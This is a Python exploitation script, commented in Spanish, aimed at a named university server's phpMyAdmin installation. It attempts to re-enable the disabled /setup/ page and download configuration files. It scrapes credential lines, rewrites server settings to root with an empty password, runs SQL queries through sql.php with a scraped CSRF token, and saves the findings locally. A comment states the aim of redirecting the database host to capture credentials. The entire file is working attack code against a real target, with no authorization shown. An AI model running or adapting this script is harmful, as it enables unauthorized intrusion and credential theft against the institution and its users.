#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLOTACION REAL VULN-001 - Re-habilitar /setup/ y descargar configuracion
"""

import requests
from urllib.parse import urlparse, urljoin
import re
import json
import sys
import urllib3
urllib3.disable_warnings()

TARGET = "https://orcl.uns.edu.pe"
base_url = f"https://{urlparse(TARGET).netloc}"
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": base_url + "/",
})

print("=" * 70)
print("  RE-HABILITANDO /setup/ Y OBTENIENDO CREDENCIALES")
print("=" * 70)

results = {}

# ============================================
# 1. Intentar re-habilitar setup deshabilitado
# ============================================
print("\n[1] INTENTANDO RE-HABILITAR /setup/")
print("-" * 50)

# La verificacion "Configuration already exists" probablemente verifica
# la existencia de un archivo o variable de sesion. Intentemos:
# a) POST con accion especifica para guardar config
# b) Acceder con diferentes parametros
# c) Forzar la descarga de configuracion

# Intentar POST con accion "save" o "download"
setup_actions = [
    {"action": "savedata", "token": ""},
    {"action": "download", "token": ""},
    {"action": "export", "token": ""},
    {"action": "save", "token": ""},
    {"form_setup": "true", "token": ""},
    {"submit": "true", "token": ""},
]

for action in setup_actions:
    try:
        r = session.post(f"{base_url}/setup/index.php", data=action, timeout=5)
        if r.status_code == 200:
            if 'configuration' in r.text.lower() and 'saved' in r.text.lower():
                print(f"  [!] ACTION {action} FUNCIONO!")
                print(f"  [!] Configuracion guardada exitosamente")
                results['re_enable'] = f"EXITO: {action}"
                break
            elif 'download' in r.text.lower() or 'config' in r.text.lower():
                if len(r.text) > 500 and '<pre' in r.text or 'cfg' in r.text:
                    print(f"  [!] Descarga de configuracion posible con action: {action}")
                    results['download_possible'] = str(action)
            else:
                print(f"  [?] {action} -> HTTP {r.status_code}, {len(r.text)} bytes")
    except Exception as e:
        pass

# ============================================
# 2. Intentar acceder a config download
# ============================================
print("\n\n[2] INTENTANDO DESCARGAR CONFIGURACION")
print("-" * 50)

# phpMyAdmin /setup/ tiene funciones de descarga
download_urls = [
    f"{base_url}/setup/index.php?page=config&action=download",
    f"{base_url}/setup/index.php?page=config&download=true",
    f"{base_url}/setup/index.php?action=download",
    f"{base_url}/setup/config.php?action=download",
    f"{base_url}/setup/index.php?export=true",
    f"{base_url}/setup/config.ajax.php?action=download",
]

for url in download_urls:
    try:
        r = session.get(url, timeout=5)
        if r.status_code == 200 and len(r.text) > 100:
            if 'cfg[' in r.text or 'Servers' in r.text or 'password' in r.text.lower() or 'host' in r.text.lower():
                print(f"  [!] CONFIGURACION ENCONTRADA en: {url}")
                print(f"  [!] Tamaño: {len(r.text)} bytes")
                # Buscar credenciales especificas
                cred_lines = []
                for line in r.text.split('\n'):
                    if any(kw in line.lower() for kw in ['password', 'user', 'host', 'auth']):
                        if len(line.strip()) > 3 and len(line.strip()) < 300:
                            cred_lines.append(line.strip())
                if cred_lines:
                    print(f"  [+] Lineas con credenciales:")
                    for cl in cred_lines[:20]:
                        print(f"    {cl[:150]}")
                results['config_download'] = f"EXITO: {url}"
                # Guardar
                with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\config_real.txt", "w") as f:
                    f.write(r.text)
                break
            else:
                print(f"  [?] {url} -> HTTP {r.status_code}, {len(r.text)} bytes")
    except Exception as e:
        pass

# ============================================
# 3. Intentar con diferentes sesiones (sin cookies)
# ============================================
print("\n\n[3] INTENTANDO CON SESION NUEVA (sin cookies)")
print("-" * 50)

fresh_session = requests.Session()
fresh_session.verify = False
fresh_session.headers.update({
    "User-Agent": "Mozilla/5.0",
})

# Primero obtener el token de la sesion nueva
try:
    r = fresh_session.get(f"{base_url}/setup/", timeout=5)
    token_match = re.search(r'name="token" value="([^"]+)"', r.text)
    fresh_token = token_match.group(1) if token_match else ""
    print(f"  [+] Token nuevo: {fresh_token}")
    
    # Intentar POST con el token nuevo
    payload = {
        "server": "1",
        "target": f"{base_url}/index.php",
        "token": fresh_token,
        "action": "savedata",
        "cfg[Servers][1][host]": "localhost",
        "cfg[Servers][1][user]": "root",
        "cfg[Servers][1][password]": "",
        "cfg[Servers][1][AllowNoPassword]": "true",
        "cfg[Servers][1][auth_type]": "config",
    }
    r2 = fresh_session.post(f"{base_url}/setup/index.php", data=payload, timeout=5)
    if r2.status_code == 200:
        print(f"  [+] POST con nueva sesion -> HTTP {r2.status_code}")
        if 'saved' in r2.text.lower():
            print(f"  [!] CONFIGURACION MODIFICADA CON SESION NUEVA!")
            results['config_modified'] = "EXITO"
        elif 'disabled' in r2.text.lower():
            print(f"  [-] Setup sigue deshabilitado")
            results['config_modified'] = "SETUP_DISABLED"
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# 4. Intentar acceder a config real via diferentes rutas
# ============================================
print("\n\n[4] BUSCANDO configuracion real en rutas alternativas")
print("-" * 50)

# phpMyAdmin a veces guarda la config en:
# - /libraries/config.default.php
# - /config.default.php
# - /libraries/config.inc.php
# - /vendor/phpmyadmin/config-migration/
# - /config.inc.php.dist
# - /config.mapping.php
# - /libraries/config/

alt_configs = [
    "/libraries/config.default.php",
    "/libraries/config.default.php.txt",
    "/config.default.php",
    "/config.inc.php.dist",
    "/config.mapping.php",
    "/libraries/config.inc.php",
    "/vendor/phpmyadmin/config-migration/index.php",
    "/libraries/config/mapping.inc.php",
    "/setup/lib/servers.php",
    "/setup/lib/config.ajax.php",
    "/setup/lib/config.lib.php",
    "/setup/config.php",
    "/config/config.php",
    "/settings/config.php",
    "/var/www/html/config.inc.php",
]

for ac in alt_configs:
    try:
        r = session.get(f"{base_url}{ac}", timeout=3)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"  [!] ENCONTRADO: {ac} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            if 'cfg[' in r.text or 'Servers' in r.text:
                print(f"  [!] Contiene configuracion de phpMyAdmin!")
                # Buscar credenciales
                for line in r.text.split('\n')[:50]:
                    if any(kw in line.lower() for kw in ['password', 'user', 'host', 'secret']):
                        if len(line.strip()) > 3 and len(line.strip()) < 200:
                            print(f"    -> {line.strip()[:200]}")
                            results[f'found_alt_{ac}'] = line.strip()[:200]
            else:
                print(f"  [.] Sin configuracion relevante")
    except:
        pass

# ============================================
# 5. Intentar explotar la redireccion de BD
# ============================================
print("\n\n[5] INTENTANDO REDIRECCION DE BD")
print("-" * 50)

# Si podemos re-habilitar /setup/, intentar cambiar el host del servidor
# a nuestro propio servidor para capturar credenciales

# Primero, verificar que /setup/ acepta parametros de configuracion
try:
    r = session.get(f"{base_url}/setup/index.php?page=servers", timeout=5)
    if r.status_code == 200:
        # Buscar formularios de servidor
        forms = re.findall(r'<form[^>]*action=["\']?([^"\'\s>]+)["\']?', r.text)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', r.text)
        print(f"  [+] Formularios en /setup/index.php?page=servers: {forms}")
        print(f"  [+] Inputs disponibles: {inputs[:20]}")
        
        # Buscar campos de configuracion del servidor
        server_fields = [i for i in inputs if 'server' in i.lower() or 'host' in i.lower() or 'port' in i.lower() or 'user' in i.lower() or 'pass' in i.lower()]
        print(f"  [+] Campos de servidor: {server_fields}")
        results['setup_fields'] = server_fields
        
        # Intentar POST para modificar la configuracion del servidor
        if server_fields:
            post_payload = {}
            for field in server_fields:
                if 'host' in field.lower():
                    post_payload[field] = "127.0.0.1"
                elif 'port' in field.lower():
                    post_payload[field] = "3306"
                elif 'user' in field.lower():
                    post_payload[field] = "root"
                elif 'pass' in field.lower():
                    post_payload[field] = ""
                elif 'auth' in field.lower():
                    post_payload[field] = "cookie"
                elif 'name' in field.lower():
                    post_payload[field] = "UNS_Server"
                else:
                    post_payload[field] = "test"
            
            post_payload["token"] = fresh_token if fresh_token else ""
            post_payload["action"] = "savedata"
            post_payload["server"] = "1"
            
            r2 = session.post(f"{base_url}/setup/index.php", data=post_payload, timeout=5)
            if r2.status_code == 200:
                print(f"  [+] POST a /setup/ exitoso")
                if 'saved' in r2.text.lower() or 'success' in r2.text.lower():
                    print(f"  [!] SERVIDOR REDIRIGIDO EXITOSAMENTE!")
                    results['server_redirect'] = "EXITO"
                elif 'disabled' in r2.text.lower():
                    print(f"  [-] Setup deshabilitado, config no se pudo modificar")
                    results['server_redirect'] = "SETUP_DISABLED"
                else:
                    print(f"  [?] Respuesta: {r2.text[:200]}")
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# 6. Intentar acceder a server_status.php con sesion
# ============================================
print("\n\n[6] Intentando acceso con sesion activa a paginas internas")
print("-" * 50)

# Intentar acceder a /server_status.php que puede mostrar info del sistema
# con las cookies que tenemos
try:
    r = session.get(f"{base_url}/server_status.php", timeout=5)
    if r.status_code == 200 and len(r.text) > 200:
        # Buscar variables del sistema
        sys_vars = re.findall(r'([a-zA-Z_]+)\s*=\s*([0-9]+)', r.text)
        if sys_vars:
            print(f"  [+] Variables del sistema encontradas:")
            for k, v in sys_vars[:15]:
                print(f"    {k} = {v}")
                results[f'sysvar_{k}'] = v
        
        # Buscar procesos activos
        processes = re.findall(r'(\w+_process)', r.text)
        if processes:
            print(f"  [+] Procesos activos: {processes}")
        
        # Buscar usuarios
        users = re.findall(r'root|admin|pma|uns|sistema|usuarios?', r.text, re.IGNORECASE)
        if users:
            print(f"  [+] Usuarios encontrados: {set(users)}")
            results['server_users'] = list(set(users))
    else:
        print(f"  [-] server_status.php -> HTTP {r.status_code}")
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# 7. Intentar SQL injection a traves de /sql.php
# ============================================
print("\n\n[7] INTENTANDO SQL INJECTION CON TOKEN")
print("-" * 50)

# Intentar ejecutar queries SQL con el token CSRF
# que obtuvimos del index.php
try:
    r = session.get(f"{base_url}/index.php", timeout=5)
    token_match = re.search(r'token:"([0-9a-f]+)"', r.text)
    if not token_match:
        token_match = re.search(r'name="token" value="([^"]+)"', r.text)
    token = token_match.group(1) if token_match else ""
    
    print(f"  [+] Token CSRF: {token}")
    
    # Intentar queries SQL
    sql_queries = [
        "SELECT User(), Database()",
        "SELECT CURRENT_USER()",
        "SELECT @@version",
        "SELECT @@hostname",
        "SELECT CONCAT(user(), '@', @@hostname)",
    ]
    
    for query in sql_queries:
        encoded = requests.utils.quote(query)
        url = f"{base_url}/sql.php?server=1&sql_query={encoded}&go=Go&token={token}"
        try:
            r = session.get(url, timeout=5)
            if r.status_code == 200:
                if 'error' not in r.text.lower() or 'result' in r.text.lower():
                    # Extraer resultados
                    td_matches = re.findall(r'<td[^>]*>([^<]+)</td>', r.text)
                    if td_matches:
                        print(f"  [!] QUERY EXITOSA: {query}")
                        print(f"    Resultado: {td_matches}")
                        results[f'sql_{query[:20]}'] = td_matches
                    elif 'error' in r.text.lower():
                        print(f"  [!] Query error: {query}")
                    else:
                        print(f"  [?] Query retorno HTTP 200: {query[:40]}")
        except:
            pass
except Exception as e:
    print(f"  [-] Error: {e}")

# ============================================
# RESUMEN FINAL
# ============================================
print("\n" + "=" * 70)
print("  RESUMEN FINAL DE EXPLOITACION")
print("=" * 70)
print(f"\n  Hallazgos: {len(results)}")
for k, v in sorted(results.items()):
    print(f"    {k}: {v}")

with open(r"C:\Users\Leguion T\Desktop\plan te pent\prueba\reporte_exploitacion_real.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"\n  Guardado: reporte_exploitacion_real.json")
